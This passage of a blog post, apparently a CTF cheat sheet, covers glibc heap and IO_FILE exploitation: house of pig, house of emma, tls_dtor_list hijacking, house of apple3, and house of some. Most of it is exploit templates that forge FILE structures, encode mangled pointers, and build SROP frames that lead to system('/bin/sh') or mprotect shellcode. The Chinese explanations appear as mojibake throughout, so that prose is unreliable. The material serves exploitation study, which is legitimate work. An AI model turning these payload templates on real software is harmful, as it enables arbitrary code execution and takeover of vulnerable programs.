class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">        || __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">        || __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h3><p>ä¸»è¦æ˜¯åˆ©ç”¨<code>_IO_str_overflow</code>è¿™ä¸ª<code>io</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸­å¯ä»¥å®Œæˆ<code>malloc</code>ã€<code>memcpy</code>ã€<code>free</code>ä¸€æ¡é¾™æœåŠ¡<br>ä¸”è¯¥å‡½æ•°æ±‡ç¼–ä¸­å­˜åœ¨ä¸‹é¢è¿™æ®µä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7e2f0dd &lt;+61&gt;:    mov    rdx,QWORD PTR [rdi+0x28]</span><br></pre></td></tr></table></figure><p>rdiæŒ‡å‘<code>IO_FILE</code>ç»“æ„ä½“é¦–åœ°å€ï¼Œå¯ä»¥æ–¹ä¾¿æˆ‘ä»¬æ¥é€šè¿‡<code>setcontext+61</code>æ¥æ‰“<code>srop</code><br>é«˜ç‰ˆæœ¬æ²¡æœ‰<code>hook</code>å‡½æ•°ï¼Œå¯æ˜¯<code>_IO_str_overflow</code>ä¸­å­˜åœ¨<code>memset</code>å‡½æ•°çš„è°ƒç”¨ï¼Œè€Œä¸”è¯¥å‡½æ•°çš„<code>got</code>è¡¨åœ¨<code>glibc</code>ï¼Œ<code>glibc</code>ä¸­çš„<code>got</code>è¡¨å¯å†™ï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹<code>got</code>è¡¨æ¥è¾¾åˆ°å’Œ<code>hook</code>ç›¸åŒçš„æ•ˆæœ<br>fake_file</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨0xa0çš„tcacheé“¾è¡¨å¤´ä¼ªé€ ä¸€ä¸ªmemset_got_addrçš„åœ°å€</span></span><br><span class="line"><span class="comment"># magic_gadgetï¼šmov rdx, rbx ; mov rsi, r12 ; call qword ptr [r14 + 0x38]</span></span><br><span class="line">fake_stderr = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(fake_stderr_addr+<span class="number">0xf0</span>) + p64(fake_stderr_addr+<span class="number">0x108</span>)</span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="comment"># _lock</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># srop</span></span><br><span class="line">fake_stderr += p64(rop_address + <span class="number">0x10</span>) + p64(ret_addr) <span class="comment"># rsp rip</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc.sym[<span class="string">&#x27;_IO_str_jumps&#x27;</span>] - <span class="number">0x20</span>)</span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fake_stderr += p64(magic_gadget) + p64(<span class="number">0</span>) <span class="comment"># r14 r14+8</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span>) <span class="comment"># r14 + 0x38</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨<code>memset</code>ä¹‹å‰ä»ç„¶æœ‰<code>free(IO-&gt;buf_base)</code>ï¼Œå› æ­¤éœ€è¦ä¼ªé€ ä¸€ä¸‹<code>memset_got_addr</code>çš„<code>fake chunk</code>çš„å †å—å¤´ï¼Œä»¥åŠå…¶<code>next chunk</code>çš„å †å—å¤´<br>æœ€ç»ˆé€šè¿‡<code>exit()</code>å‡½æ•°æˆ–è€…ç¨‹åºæ­£å¸¸é€€å‡ºè§¦å‘æ”»å‡»</p><h3 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h3><p>house of emmaä¸»è¦åˆ©ç”¨äº†<code>_IO_cookie_jumps</code>è¿™ä¸ª<code>vtable</code><br>åˆ©ç”¨<code>house of KiWi</code>é…åˆ<code>house of emma</code>çš„è°ƒç”¨é“¾ä¸º<code>__malloc_assert</code> -&gt; <code>__fxprintf</code> -&gt; <code>__vfxprintf</code> -&gt; <code>locked_vfxprintf</code> -&gt; <code>__vfprintf_internal</code> -&gt; <code>_IO_new_file_xsputn</code> ( &#x3D;&gt; <code>_IO_cookie_write</code>)ï¼Œè¿™é‡Œç”¨çš„æ˜¯<code>_IO_cookie_write</code>å‡½æ•°ï¼Œç”¨å…¶ä»–çš„å½“ç„¶ä¹ŸåŒç†<br>fså¯„å­˜å™¨çš„å€¼å’Œåœ°å€å¯ä»¥é€šè¿‡<code>x/16gx pthread_self()</code>æŒ‡ä»¤æ¥æŸ¥çœ‹<br>fake_file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># __pointer_chk_guardä¸ºtls[0x30]å¤„çš„å€¼ï¼Œç”¨äºå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"> </span><br><span class="line">magic_gadget = libc.address + <span class="number">0x1460e0</span> <span class="comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line"></span><br><span class="line">fake_stderr = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_stderr += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="comment"># _lock</span></span><br><span class="line"><span class="comment"># _IO_flockfile(fp) in __vfxprintf</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="number">0x40</span>) <span class="comment"># fake_vtable</span></span><br><span class="line"><span class="comment"># call [vtable]+0x38 (call _IO_new_file_xsputn)</span></span><br><span class="line"><span class="comment"># =&gt; call _IO_cookie_jumps+0x78 =&gt; call _IO_cookie_write</span></span><br><span class="line">fake_stderr += p64(srop_address) <span class="comment"># __cookie (rdi)</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>)</span><br><span class="line">fake_stderr += p64(ROL(magic_gadget ^ __pointer_chk_guard, <span class="number">0x11</span>, <span class="number">64</span>)) <span class="comment"># __io_functions.write</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆé€šè¿‡<code>_malloc_hook</code>æ¥è§¦å‘(<code>&lt;=2.36</code>)<br>å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡<code>_IO_flush_all</code>æ¥è§¦å‘ï¼Œä¸è¿‡ç”±äºåœ¨<code>exit</code>å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ä¸­ä¼šå‡ºç°å¾ˆå¤šä¼šå‡ºç°è°ƒç”¨åˆ«çš„ç»™åŠ å¯†è¿‡çš„å‡½æ•°æŒ‡é’ˆï¼Œç”±äº<code>__pointer_chk_guard</code>å·²ç»ç»™æˆ‘ä»¬ä¿®æ”¹ï¼Œæ‰€ä»¥è¿™äº›å‡½æ•°æŒ‡é’ˆåœ¨ç»™è°ƒç”¨çš„æ—¶å€™ä¼šç»™æŠ¥é”™ï¼Œå³è¯¥æ–¹æ³•çš„åˆ©ç”¨æ¯”è¾ƒéº»çƒ¦ï¼Œä¸å»ºè®®ä½¿ç”¨</p><h3 id="åŠ«æŒtls-dtor-listï¼Œåˆ©ç”¨-call-tls-dtorsæ‹¿åˆ°æƒé™"><a href="#åŠ«æŒtls-dtor-listï¼Œåˆ©ç”¨-call-tls-dtorsæ‹¿åˆ°æƒé™" class="headerlink" title="åŠ«æŒtls_dtor_listï¼Œåˆ©ç”¨__call_tls_dtorsæ‹¿åˆ°æƒé™"></a>åŠ«æŒtls_dtor_listï¼Œåˆ©ç”¨__call_tls_dtorsæ‹¿åˆ°æƒé™</h3><p>ä¸»è¦åŠŸèƒ½ä¸º<code>getshell</code>,å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨<code>setcontext+61</code>æ‰“<code>srop</code><br>dtor_list:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    dtor_func func;</span><br><span class="line">    <span class="type">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">tls_dtor_list</span>;</span></span><br></pre></td></tr></table></figure><p>__call_tls_dtors:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line"> </span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>func</code>å…¶å®æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè€Œ<code>obj</code>åˆ™æ˜¯æŒ‡å‘è¯¥å‡½æ•°çš„å‚æ•°çš„ä½ç½®<br>æˆ‘ä»¬å¯ä»¥å°†<code>tls_dtor_list</code>æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„å †åœ°å€ï¼Œå°†<code>func</code>æ”¹ä¸º<code>system</code>çš„åœ°å€(<code>ogg</code>ä¹Ÿå¯ä»¥)ï¼Œ<code>obj</code>æŒ‡å‘<code>/bin/sh\x00</code>å³å¯<code>getshell</code><br>æ³¨æ„ï¼Œè¿™é‡Œå¯¹<code>func</code>è¿™ä¸ªå‡½æ•°æŒ‡é’ˆè¿›è¡Œäº†åŠ å¯†ï¼Œæ‰€ä»¥è¦æ³„éœ²å‡º<code>__pointer_chk_guard</code>çš„å€¼æˆ–å°†å…¶ä¿®æ”¹ä¸ºå·²çŸ¥çš„å€¼<br>fså¯„å­˜å™¨çš„å€¼å’Œåœ°å€å¯ä»¥é€šè¿‡<code>x/16gx pthread_self()</code>æŒ‡ä»¤æ¥æŸ¥çœ‹<br>æ¨¡æ¿ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROL = lambda val, r_bits, max_bits: \</span><br><span class="line">(val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>) | \</span><br><span class="line">((val &amp; (<span class="number">2</span>**max_bits<span class="number">-1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line">    # ä¸¤æ¬¡largebin attackæ”¹tls_dtor_listä¸pointer_guard</span><br><span class="line"></span><br><span class="line">    fake_pointer_guard = heap_base + <span class="number">0x17b0</span></span><br><span class="line">    edit(<span class="number">0</span>, b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x420</span> + p64(ROL(libc.sym[<span class="string">&#x27;system&#x27;</span>] ^ fake_pointer_guard, <span class="number">0x11</span>, <span class="number">64</span>)) + p64(next(libc.search(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))))</span><br></pre></td></tr></table></figure><p>è‹¥æ˜¯æƒ³<code>orw</code>ï¼Œé‚£ä¹ˆå¯ä»¥è®©<code>func</code>æˆå‘˜ä¸º<code>magic_gadget</code>çš„ç›¸å…³æ•°æ®ï¼Œå°†<code>rdi</code>ä¸<code>rdx</code>è½¬æ¢åï¼Œå†è°ƒç”¨<code>setcontext + 61</code>èµ°<code>SROP</code>å³å¯<br>æœ€ç»ˆé€šè¿‡<code>exit()</code>å‡½æ•°é€€å‡ºç¨‹åºè§¦å‘æ”»å‡»</p><h3 id="house-of-apple3-house-of-ä¸€éª‘å½“åƒ"><a href="#house-of-apple3-house-of-ä¸€éª‘å½“åƒ" class="headerlink" title="house of apple3 + house of ä¸€éª‘å½“åƒ"></a>house of apple3 + house of ä¸€éª‘å½“åƒ</h3><p>è¿™ä¸ªæ¨¡æ¿ä¸ºä¸¤ç§æ‰“æ³•ç›¸ç»“åˆï¼Œ<code>house of ä¸€éª‘å½“åƒ</code>çš„å¥½å¤„æ˜¯æ‰“<code>orw</code>æ—¶ä¸éœ€è¦ç”¨åˆ°<code>magic gadget</code>ã€‚<code>house of apple3</code>çš„å…³æ³¨ç‚¹ä¸»è¦æ˜¯å¯¹æˆå‘˜<code>_codecvt</code>çš„åˆ©ç”¨ï¼Œå½“<code>wfile</code>çš„<code>vtable</code>ç»™ä¸Šä¿æŠ¤åä¾ç„¶å¯ä»¥ä½¿ç”¨<br>æ¨¡æ¿:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">fake_file_addr = <span class="number">0x3a60</span>+heap_base</span><br><span class="line">fake_ucontext_addr = fake_file_addr + <span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># house of apple3</span></span><br><span class="line">fake_file = p64(np.uint(-<span class="number">21</span>))+p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#_IO_read_endtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) </span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(fake_file_addr + <span class="number">0x100</span>)<span class="comment"># _IO_buf_end = fake_addr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x98</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(fake_file_addr + <span class="number">0x40</span>)<span class="comment">#  _codecvt</span></span><br><span class="line">fake_file += p64(libc_base+<span class="number">0x1fe6e0</span>)<span class="comment"># _wide_data  å°½é‡ä¿æŒä¸å˜ </span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x8</span>)<span class="comment"># vtable</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># fake_ucontext_addr rdi è¿™ä¸ªåœ°æ–¹å¿…é¡»ä¸º0 å’Œè¿™é‡Œåç§»0x1c0çš„ä½ç½®å¿…é¡»ä¸º0</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">fake_file += p64(setcontext)  <span class="comment"># ç”¨äºæ§åˆ¶rip setcontext(ä¸€éª‘å½“åƒ)/setcontext+61/system(rdiä¸å¥½æ§åˆ¶)/ogg(è¿™ä¸ªæ²¡è¯•è¿‡)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># house of ä¸€éª‘å½“åƒ</span></span><br><span class="line">rdi  = fake_ucontext_addr &amp; ~<span class="number">0xfff</span>  <span class="comment"># heap_addr binsh_addr</span></span><br><span class="line">rsi  = <span class="number">0x1000</span>      </span><br><span class="line">rbp  = fake_ucontext_addr  + <span class="number">0x100</span></span><br><span class="line">rbx  = <span class="number">0</span></span><br><span class="line">rdx  = <span class="number">7</span></span><br><span class="line">rcx  = <span class="number">0</span></span><br><span class="line">rax  = <span class="number">0</span></span><br><span class="line">rsp  = fake_ucontext_addr + <span class="number">0x100</span></span><br><span class="line">rip  = mprotect</span><br><span class="line"></span><br><span class="line">ucontext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ucontext += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">ucontext += p64(rdi) + p64(rsi)</span><br><span class="line">ucontext += p64(rbp) + p64(rbx)</span><br><span class="line">ucontext += p64(rdx) + p64(rcx)</span><br><span class="line">ucontext += p64(rax)</span><br><span class="line">ucontext += p64(rsp) + p64(rip)</span><br><span class="line">ucontext = ucontext.ljust((<span class="number">0xe0</span> - <span class="number">0x30</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">ucontext += p64(heap_base + <span class="number">0x1000</span>)</span><br><span class="line">ucontext = ucontext.ljust((<span class="number">0x100</span> - <span class="number">0x30</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = p64(fake_ucontext_addr + <span class="number">0x110</span>) + p64(<span class="number">0</span>) + asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = fake_file + ucontext + <span class="built_in">bytes</span>(shellcode)</span><br></pre></td></tr></table></figure><h3 id="house-of-some"><a href="#house-of-some" class="headerlink" title="house of some"></a>house of some</h3><p>Csomeå­¦é•¿æå‡ºçš„åˆ©ç”¨é“¾ï¼Œä¸»è¦æ˜¯é€šè¿‡ä¼ªé€ <code>fake_file</code>æ¥é€ æˆä»»æ„åœ°å€å†™å’Œä»»æ„åœ°å€è¯»<br>å…¶ä¸­<code>fake_file</code>åˆ†ä¸º<code>write_file</code>å’Œ<code>read_file</code>,ä»¤<code>_IO_list_all</code>æŒ‡å‘ä¸€ä¸ª<code>read_file</code>ï¼Œå¹¶ä»¤<code>write_file</code>çš„<code>_chain</code>æŒ‡å‘å°†è¦æ‰§è¡Œçš„<code>read</code>å‡½æ•°æ‰€å†™å…¥çš„åœ°å€ã€‚åœ¨è¿›è¡Œ<code>fsop</code>æ—¶ä¼šéå†åˆ°<code>read_file</code>æ‰§è¡Œ<code>read</code>å‡½æ•°ï¼Œæ­¤æ—¶å†™å…¥<code>write_file</code>,å¹¶ä»¤å…¶<code>_chain</code>æŒ‡å‘å¦å¤–ä¸€ä¸ªæˆ‘ä»¬å·²ç»å†™å¥½çš„<code>read_file</code>ã€‚æ­¤æ—¶ç”±äºæˆ‘ä»¬ç¬¬ä¸€ä¸ª<code>read_flie</code>çš„<code>_chain</code>å·²ç»æŒ‡å‘æˆ‘ä»¬<code>read</code>å‡½æ•°æ‰€å†™å…¥çš„åœ°å€ï¼Œè€Œè¯¥åœ°å€å·²ç»è¢«æˆ‘ä»¬å†™å…¥äº†<code>write_file</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥<code>write_file</code>æ¥æ³„éœ²ä»»æ„åœ°å€ã€‚æ‰§è¡Œå®Œ<code>wirte</code>å‡½æ•°å<code>rip</code>åˆ™ä¼šç»§ç»­éå†åˆ°æˆ‘ä»¬ä¸‹ä¸€ä¸ª<code>read_file</code>ã€‚æˆ‘ä»¬ä¾¿å¯ä»¥ä¸æ–­çš„è¿›è¡Œ<code>read-write-read</code>è¿™æ ·ä¸€ä¸ªè¿‡ç¨‹,å¯ä»¥æ— æ•°æ¬¡æ³„éœ²ç¨‹åºçš„æ‰€æœ‰åœ°å€å’Œä¿®æ”¹ä»»ä½•åœ°å€ä¸­çš„å†…å®¹<br>write_file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_file_write = flat(&#123;</span><br><span class="line">  <span class="number">0x00</span>: <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment"># _flags</span></span><br><span class="line">  <span class="number">0x20</span>: éœ€è¦æ³„éœ²çš„èµ·å§‹åœ°å€, <span class="comment"># _IO_write_base</span></span><br><span class="line">  <span class="number">0x28</span>: éœ€è¦æ³„éœ²çš„ç»ˆæ­¢åœ°å€, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">  <span class="number">0x68</span>: ä¸‹ä¸€ä¸ªè°ƒç”¨çš„fake fileåœ°å€, <span class="comment"># _chain</span></span><br><span class="line">  <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">  <span class="number">0xd8</span>: _IO_file_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><p>read_file:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_file_read = flat(&#123;</span><br><span class="line">  <span class="number">0x00</span>: <span class="number">0</span>, <span class="comment"># _flags</span></span><br><span class="line">  <span class="number">0x20</span>: <span class="number">0</span>, <span class="comment"># _IO_write_base</span></span><br><span class="line">  <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">  <span class="number">0x38</span>: ä»»æ„åœ°å€å†™çš„èµ·å§‹åœ°å€, <span class="comment"># _IO_buf_base</span></span><br><span class="line">  <span class="number">0x40</span>: ä»»æ„åœ°å€å†™çš„ç»ˆæ­¢åœ°å€, <span class="comment"># _IO_buf_end</span></span><br><span class="line">  <span class="number">0x68</span>: ä¸‹ä¸€ä¸ªè°ƒç”¨çš„fake fileåœ°å€, <span class="comment"># _chain</span></span><br><span class="line">  <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">  <span class="number">0x82</span>: <span class="string">b&quot;\x00&quot;</span>, <span class="comment"># _vtable_offset</span></span><br><span class="line">  <span class="number">0xa0</span>: wide_dataçš„åœ°å€, <span class="comment"># _wide_data</span></span><br><span class="line">  <span class="number">0xc0</span>: <span class="number">2</span>, <span class="comment"># _mode</span></span><br><span class="line">  <span class="number">0xd8</span>: _IO_wfile_jumps, <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fake_wide_data = flat(&#123;</span><br><span class="line">  <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="number">0x20</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="number">0xe0</span>: _IO_file_jumps - <span class="number">0x48</span>,</span><br><span class="line">&#125;, filler=<span 